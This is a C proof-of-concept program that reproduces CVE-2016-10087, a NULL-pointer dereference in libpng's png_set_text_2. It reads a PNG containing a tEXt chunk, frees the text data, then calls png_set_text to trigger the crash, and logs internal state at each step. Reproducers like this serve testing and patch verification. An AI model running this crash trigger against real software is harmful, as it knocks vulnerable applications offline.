#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <png.h>

/*
 * Reproducer for CVE-2016-10087 — NULL dereference in png_set_text_2.
 *
 * Trigger sequence:
 *   1. png_read_info processes a tEXt chunk → info->text allocated,
 *      max_text=9, num_text=1.
 *   2. png_free_data(PNG_FREE_TEXT,-1) → text=NULL, num_text=0,
 *      but max_text stays at 9 (the bug: not zeroed).
 *   3. png_set_text(1 entry) → png_set_text_2 checks 0+1 > 9 → false,
 *      skips realloc, dereferences info->text[0] with text=NULL → crash.
 *
 * Input: any PNG that contains at least one tEXt chunk (e.g. poc_cve_2016_10087.png).
 * Without a tEXt chunk max_text stays 0, the condition 1>0 triggers a fresh
 * allocation, and the crash does not occur.
 */
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <poc.png>\n", argv[0]);
        return 1;
    }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { perror("fopen"); return 1; }

    png_structp png = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png) { fclose(fp); return 1; }

    png_infop info = png_create_info_struct(png);
    if (!info) { png_destroy_read_struct(&png, NULL, NULL); fclose(fp); return 1; }

    if (setjmp(png_jmpbuf(png))) {
        fprintf(stderr, "libpng error before trigger — check that input has a tEXt chunk\n");
        png_destroy_read_struct(&png, &info, NULL);
        fclose(fp);
        return 1;
    }

    png_init_io(png, fp);

    /* Step 1: read info — processes tEXt chunk, sets max_text=9, num_text=1 */
    png_read_info(png, info);

    fprintf(stderr, "after png_read_info: num_text=%d  max_text=%d  text=%p\n",
            info->num_text, info->max_text, (void *)info->text);

    /* Step 2: free text — text=NULL, num_text=0, max_text stays at 9 */
    png_free_data(png, info, PNG_FREE_TEXT, -1);

    fprintf(stderr, "after png_free_data:  num_text=%d  max_text=%d  text=%p\n",
            info->num_text, info->max_text, (void *)info->text);

    /* Step 3: add text — 0+1=1 <= 9, realloc skipped, NULL deref */
    png_text t;
    memset(&t, 0, sizeof(t));
    t.compression = PNG_TEXT_COMPRESSION_NONE;
    t.key         = "Key";
    t.text        = "Value";
    t.text_length = 5;

    fprintf(stderr, "calling png_set_text — expect NULL dereference...\n");
    png_set_text(png, info, &t, 1);   /* crash here */

    fprintf(stderr, "no crash — libpng may already be patched\n");
    png_destroy_read_struct(&png, &info, NULL);
    fclose(fp);
    return 0;
}
